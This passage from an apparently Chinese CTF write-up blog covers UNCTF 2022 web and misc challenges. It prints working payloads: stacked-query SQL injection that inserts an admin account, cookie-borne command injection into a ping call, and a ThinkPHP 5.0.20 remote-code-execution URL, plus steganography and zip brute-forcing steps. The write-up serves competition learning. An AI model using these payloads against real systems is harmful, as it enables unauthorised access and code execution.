<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> = <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select * from score where username=&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">addslashes_deep</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]).<span class="hljs-string">&quot;&#x27;&quot;</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;num_rows) &#123;<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(\&quot;用户已完成考试\&quot;);&lt;/script&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;insert into score values (NULL, &#x27;&quot;</span>.<span class="hljs-title function_ invoke__">addslashes_deep</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]).<span class="hljs-string">&quot;&#x27;, <span class="hljs-subst">$getscroe</span>);insert into userAnswer values (NULL, &#x27;&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;q1&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;q2&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;q3&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;q4&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;q5&#x27;</span>].<span class="hljs-string">&quot;&#x27;)&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">multi_query</span>(<span class="hljs-variable">$query</span>)===<span class="hljs-literal">TRUE</span>) &#123;<br>            <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(\&quot;已完成考试！\&quot;);&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script language=&#x27;JavaScript&#x27;&gt;location.replace(&#x27;index.php&#x27;)&lt;/script&gt;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;something error!&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>对q1q2等参数无过滤，直接拼接，很明显的漏洞。</p>
<p>先创建一个用户，登录，答题，抓修改提交答案的包</p>
<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">q1</span>=1&amp;q2=2&amp;q3=3&amp;q4=2&amp;q5=&#x27;);insert into<span class="hljs-built_in"> users </span>values (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&#x27;88&#x27;</span>, <span class="hljs-string">&#x27;309&#x27;</span>);<br><span class="hljs-attribute">q1</span>=1&amp;q2=2&amp;q3=3&amp;q4=2&amp;q5=&#x27;);UPDATE<span class="hljs-built_in"> users </span><span class="hljs-built_in">SET</span> <span class="hljs-attribute">studentid</span>=<span class="hljs-string">&#x27;011&#x27;</span> WHERE <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;8&#x27;</span>;<br><br></code></pre></td></tr></table></figure>

<p>测试一下，发现可行。</p>
<p>试图update修改修改admin密码，结果压根没有admin用户。</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">q1=1&amp;q2=2&amp;q3=3&amp;q4=2&amp;q5=&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users <span class="hljs-keyword">values</span> (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;123&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>成功登录</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744875.png" srcset="/img/loading.gif" lazyload alt="image-20221114141301709"></p>
<p>随便查找一个用户成绩</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744876.png" srcset="/img/loading.gif" lazyload alt="image-20221114141328020"></p>
<p>得到flag。</p>
<h2 id="我太喜欢bilibili大学啦修复版-中北大学"><a href="#我太喜欢bilibili大学啦修复版-中北大学" class="headerlink" title="我太喜欢bilibili大学啦修复版-中北大学"></a>我太喜欢bilibili大学啦修复版-中北大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744877.png" srcset="/img/loading.gif" lazyload alt="image-20221118212934890"></p>
<p>phpinfo得到hint1：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">YWRtaW5fdW5jdGYucGhw</span> <br><br>admin_unctf.php<br></code></pre></td></tr></table></figure>

<p>抓admin_unctf.php包，得到hint2</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">dW5jdGYyMDIyL3VuY3RmMjAyMg</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><br>unctf2022/unctf2022<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744878.png" srcset="/img/loading.gif" lazyload alt="image-20221115131424473"></p>
<p>可知是一个登录密码，登录得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;FLAG=nonono&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;username or password is empty&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&quot;unctf2022&quot;</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-string">&quot;unctf2022&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>        @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping &quot;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;username or password error&quot;</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">post:</span><br>username<span class="hljs-operator">=</span>unctf<span class="hljs-number">2022</span>&amp;password<span class="hljs-operator">=</span>unctf<span class="hljs-number">2022</span>&amp;+<span class="hljs-operator">=</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%99</span><span class="hljs-variable">%BB</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%BD</span><span class="hljs-variable">%95</span><br><span class="hljs-symbol">cookie:</span><br>cmd<span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>||cat /flag<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744879.png" srcset="/img/loading.gif" lazyload alt="image-20221115131553157"></p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">aHR<span class="hljs-number">0</span>cH<span class="hljs-name">M6</span>Ly<span class="hljs-number">9</span>zcGFjZS<span class="hljs-number">5</span>iaWxpYmlsaS<span class="hljs-number">5</span>jb<span class="hljs-number">20</span>v<span class="hljs-symbol">NjczOTA3</span>MzU<span class="hljs-number">2</span><br><br>https:<span class="hljs-comment">//space.bilibili.com/673907356</span><br></code></pre></td></tr></table></figure>

<p>访问得到：</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744880.png" srcset="/img/loading.gif" lazyload alt="image-20221115131628901"></p>
<h2 id="给你一刀-西南科技大学"><a href="#给你一刀-西南科技大学" class="headerlink" title="给你一刀-西南科技大学"></a>给你一刀-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744881.png" srcset="/img/loading.gif" lazyload alt="image-20221118212953156"></p>
<p>thinkphp5.0.20漏洞</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53099802/article/details/124472792">参考</a></p>
<p>payload:</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=ls<br></code></pre></td></tr></table></figure>

<p>flag在env里</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744882.png" srcset="/img/loading.gif" lazyload alt="image-20221116113401091"></p>
<h2 id="ez2048-中南大学"><a href="#ez2048-中南大学" class="headerlink" title="ez2048-中南大学"></a>ez2048-中南大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744883.png" srcset="/img/loading.gif" lazyload alt="image-20221119102541905"></p>
<p>没玩过逆向，比较菜</p>
<p>通过跟进找到了checkinvited函数（startcheck–&gt;checkinvited</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> args = [...<span class="hljs-variable language_">arguments</span>];<br><span class="hljs-keyword">let</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">24</span>);<br><span class="hljs-keyword">const</span> view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(buf);<br>view.<span class="hljs-title function_">setUint8</span>(<span class="hljs-number">0</span>, <span class="hljs-number">68</span>);<br>view.<span class="hljs-title function_">setUint8</span>(<span class="hljs-number">1</span>, <span class="hljs-number">51</span>);<br>view.<span class="hljs-title function_">setUint8</span>(<span class="hljs-number">2</span>, <span class="hljs-number">15</span>);<br>view.<span class="hljs-title function_">setUint8</span>(<span class="hljs-number">3</span>, <span class="hljs-number">80</span>);<br>view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">4</span>, <span class="hljs-number">0x0e5d</span>, <span class="hljs-literal">true</span>);<br>view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">6</span>, <span class="hljs-number">0x323a</span>, <span class="hljs-literal">true</span>);<br>view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">8</span>, <span class="hljs-number">0x3058</span>, <span class="hljs-literal">true</span>);<br>view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">10</span>, <span class="hljs-number">0x1a2a</span>, <span class="hljs-literal">true</span>);<br>view.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">12</span>, <span class="hljs-number">0x0512160d</span>, <span class="hljs-literal">true</span>);<br>view.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">16</span>, <span class="hljs-number">0x02560002</span>);<br>view.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">20</span>, <span class="hljs-number">0x130000</span>);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">code</span>) &#123;<br>  <span class="hljs-keyword">if</span> (code.<span class="hljs-property">length</span> !== <span class="hljs-number">24</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">let</span> encode = [];<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; code.<span class="hljs-property">length</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (~i % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) &#123;<br>      encode.<span class="hljs-title function_">push</span>(code.<span class="hljs-title function_">charCodeAt</span>(i) ^ code.<span class="hljs-title function_">charCodeAt</span>(i - <span class="hljs-number">2</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      encode.<span class="hljs-title function_">push</span>(code.<span class="hljs-title function_">charCodeAt</span>(i) ^ code.<span class="hljs-title function_">charCodeAt</span>(i + <span class="hljs-number">1</span>));<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; code.<span class="hljs-property">length</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (view.<span class="hljs-title function_">getInt8</span>(i) !== encode[i]) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>之前没接触过js，但是大概看懂还是没问题的，大概意思就是输入一个24位的code，然后经过异或操作得到一个数组，再与已有的数组比对，简单运行一下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// create an ArrayBuffer with a size in bytes</span><br>    <br><span class="hljs-keyword">const</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">24</span>);<br>    <span class="hljs-keyword">const</span> view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(buf);<br>    view.<span class="hljs-title function_">setUint8</span>(<span class="hljs-number">0</span>, <span class="hljs-number">68</span>);<br>    view.<span class="hljs-title function_">setUint8</span>(<span class="hljs-number">1</span>, <span class="hljs-number">51</span>);<br>    view.<span class="hljs-title function_">setUint8</span>(<span class="hljs-number">2</span>, <span class="hljs-number">15</span>);<br>    view.<span class="hljs-title function_">setUint8</span>(<span class="hljs-number">3</span>, <span class="hljs-number">80</span>);<br>    view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">4</span>, <span class="hljs-number">0x0e5d</span>, <span class="hljs-literal">true</span>);<br>    view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">6</span>, <span class="hljs-number">0x323a</span>, <span class="hljs-literal">true</span>);<br>    view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">8</span>, <span class="hljs-number">0x3058</span>, <span class="hljs-literal">true</span>);<br>    view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">10</span>, <span class="hljs-number">0x1a2a</span>, <span class="hljs-literal">true</span>);<br>    view.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">12</span>, <span class="hljs-number">0x0512160d</span>, <span class="hljs-literal">true</span>);<br>    view.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">16</span>, <span class="hljs-number">0x02560002</span>);<br>    view.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">20</span>, <span class="hljs-number">0x130000</span>);<br>	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">24</span>; i++) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(view.<span class="hljs-title function_">getUint8</span>(i));<br>      &#125;<br></code></pre></td></tr></table></figure>

<p>在控制台运行一下得到</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744884.png" srcset="/img/loading.gif" lazyload alt="image-20221117094614598"></p>
<p>一个24个元素的数组view。</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-string">[68, 51, 15, 80, 93, 14, 58, 50, 88, 48, 42, 26, 13, 22, 18, 5, 2, 86, 0, 2, 0, 19, 0, 0]</span><br></code></pre></td></tr></table></figure>

<p>通过一点点逆向可以得到</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744885.png" srcset="/img/loading.gif" lazyload alt="image-20221117100255512"></p>
<p>w3lc开头的乱码字符串，这里有点运气的成分，猜到可能是welcome to unctf2022这样的字符串，于是尝试了一下替换到game.js里面，结果确实能够得到一个类似flag的字符串（有乱码）。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">code=[<span class="hljs-number">68</span>, <span class="hljs-number">51</span>, <span class="hljs-number">15</span>, <span class="hljs-number">80</span>, <span class="hljs-number">93</span>, <span class="hljs-number">14</span>, <span class="hljs-number">58</span>, <span class="hljs-number">50</span>, <span class="hljs-number">88</span>, <span class="hljs-number">48</span>, <span class="hljs-number">42</span>, <span class="hljs-number">26</span>, <span class="hljs-number">13</span>, <span class="hljs-number">22</span>, <span class="hljs-number">18</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">86</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">19</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Db</span>(<span class="hljs-params">ch,x</span>):<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">128</span>):<br>		<span class="hljs-keyword">if</span> i^<span class="hljs-built_in">ord</span>(ch)==x:<br>			<span class="hljs-comment"># print(chr(i),end=&quot; &quot;)</span><br>			<span class="hljs-keyword">return</span>(<span class="hljs-built_in">chr</span>(i))<br><br>result=<span class="hljs-string">&quot;w3&quot;</span><br>invite1=<span class="hljs-string">&quot;w3 &quot;</span>   <span class="hljs-comment">#</span><br><span class="hljs-built_in">next</span>=<span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(code)-<span class="hljs-number">2</span>):<br>	<span class="hljs-keyword">if</span> i%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>:<br>		x=code[i+<span class="hljs-number">2</span>]<br>		<span class="hljs-built_in">next</span>=Db(<span class="hljs-built_in">next</span>,x)<br>		invite1+=<span class="hljs-built_in">next</span>+<span class="hljs-string">&quot; &quot;</span><br><span class="hljs-built_in">print</span>(invite1)<br>invite2=<span class="hljs-string">&quot;w&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(invite1)-<span class="hljs-number">1</span>):<br>	<span class="hljs-keyword">if</span> i%<span class="hljs-number">2</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> invite1[i]==<span class="hljs-string">&quot; &quot;</span>:<br>		c=Db(invite1[i+<span class="hljs-number">1</span>],code[i])<br>		invite2+=c<br><span class="hljs-built_in">print</span>(invite2)<br>invite1=invite1.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-number">1</span>:]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>):<br>	<span class="hljs-built_in">print</span>(invite2[i]+invite1[i],end=<span class="hljs-string">&quot;&quot;</span>)<br><br></code></pre></td></tr></table></figure>

<p>得到邀请码</p>
<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">w3lc0me_7o_unctf2022!!!!<br></code></pre></td></tr></table></figure>

<p>UNCTF{happy_2048_game_w1th_u1c7f2022~}</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744886.png" srcset="/img/loading.gif" lazyload alt="image-20221117005221023"></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="magic-word-西南科技大学"><a href="#magic-word-西南科技大学" class="headerlink" title="magic_word-西南科技大学"></a>magic_word-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744887.png" srcset="/img/loading.gif" lazyload alt="image-20221119102713714"></p>
<p>解压word文档</p>
<p>magic_word\word\document.xml中</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744888.png" srcset="/img/loading.gif" lazyload alt="image-20221112204235264"></p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">The Old Man <span class="hljs-built_in">and</span> the SeaHe was an old man who fished alone <span class="hljs-keyword">in</span> a skiff <span class="hljs-keyword">in</span> the Gulf Stream ‌‌‌‌‍﻿‍‍<span class="hljs-built_in">and</span> he had gone eighty-four days‌‌‌‌‍‬﻿‬ now without taking a fish. <span class="hljs-keyword">In</span> the first forty days a boy had been <span class="hljs-keyword">with</span> him. But after forty days without a fish the boy<span class="hljs-comment">&#x27;s parents had told him that the old man was now definitely and finally salao,which ‌‌‌‌‍‬‌﻿is the worst form of unlucky, and‌‌‌‌‍﻿‍‌ the boy had gone at their orders in another boat which caught three good fish‌‌‌‌‍‬‍‬ the first week. It made the boy sad to see the old man come in each day with his‌‌‌‌‍﻿‬﻿ saking a fish. In the first forty days a boy had‌‌‌‌‍‍‍﻿ been with him. But after forty days without a fish ‌‌‌‌‍‬‍‍the boy&#x27;s parents ‌‌‌‌‌﻿‌‍had told him that the old man was now definitely‌‌‌‌‍‬‌﻿ and finally salao,which ‌‌‌‌‍‬﻿﻿is the worst form of unlucky, and the boy had gone at their orders ‌‌‌‌‍‬﻿‍in another boat which caught three good fish the first week. It made the boy sad to‌‌‌‌‍‬‍‍ see the old man come in each day with his skiff empty and he always went down to help ‌‌‌‌‍‍﻿﻿him carry either the coiled lines or the gaff and harpoon and the sail that was furled aroundthe mast. The sail was patched‌‌‌‌‍‬﻿‬ with flour sacks and, furled, it looked like the flag of permanent defeat.The old man was thin and gaunt with deep wrinkles in the back of his neck.The brown blotches of the benevolent skin cancer‌‌‌‌‍‬‍‍ the sun brings from its reflection on the tropic sea‌‌‌‌‍﻿‍﻿ were‌‌‌‌‍‍﻿﻿ on his cheeks. The blotches ran well down the sides of his face and his hands had the deep-creased scars from handling heavy fish on the cords. But none of these scars were fresh. They were as old as ‌‌‌‌‍‬‌﻿erosions in fishless desert.‌‌‌‌‍﻿‍‌‌‌‌‌‍‬‍‬‌‌‌‌‍‬‍‍‌‌‌‌‍﻿‌‬‌‌‌‌‍﻿﻿‍</span><br></code></pre></td></tr></table></figure>

<p>零宽字符隐写</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744889.png" srcset="/img/loading.gif" lazyload alt="image-20221112204311458"></p>
<h2 id="找得到我吗-闽南师范大学"><a href="#找得到我吗-闽南师范大学" class="headerlink" title="找得到我吗-闽南师范大学"></a>找得到我吗-闽南师范大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744890.png" srcset="/img/loading.gif" lazyload alt="image-20221119102724057"></p>
<p>解压word文档打开document.xml</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744891.png" srcset="/img/loading.gif" lazyload alt="image-20221115221505117"></p>
<h2 id="巨鱼-河南理工大学"><a href="#巨鱼-河南理工大学" class="headerlink" title="巨鱼-河南理工大学"></a>巨鱼-河南理工大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744892.png" srcset="/img/loading.gif" lazyload alt="image-20221119102735762"></p>
<p>修改fish.png高度，得到压缩包密码</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">无所谓我会出手<br></code></pre></td></tr></table></figure>

<p>修复一下伪加密压缩包，得到psss.png和flag.pptx</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744893.png" srcset="/img/loading.gif" lazyload alt="image-20221115222759135"></p>
<p>666，压缩包密码就得到了。</p>
<p>解压后，CTRL+A最后一页，修改文字颜色，即可得到flag</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744894.png" srcset="/img/loading.gif" lazyload alt="image-20221115223120197"></p>
<h2 id="清和fan-江西警察学院"><a href="#清和fan-江西警察学院" class="headerlink" title="清和fan-江西警察学院"></a>清和fan-江西警察学院</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744895.png" srcset="/img/loading.gif" lazyload alt="image-20221119102748179"></p>
<p>通过压缩包末尾信息爆破</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744896.png" srcset="/img/loading.gif" lazyload alt="image-20221116093550076"></p>
<p>前六个数字，掩码爆破，无果后尝试修改后面的日期，</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span>_202?<span class="hljs-regexp">/0?/</span><span class="hljs-string">??</span><br></code></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744897.png" srcset="/img/loading.gif" lazyload alt="image-20221116101431145" style="zoom: 67%;">

<p>整个爆破时间也只需要三四分钟</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">836885_2022</span>/<span class="hljs-number">05</span>/<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure>



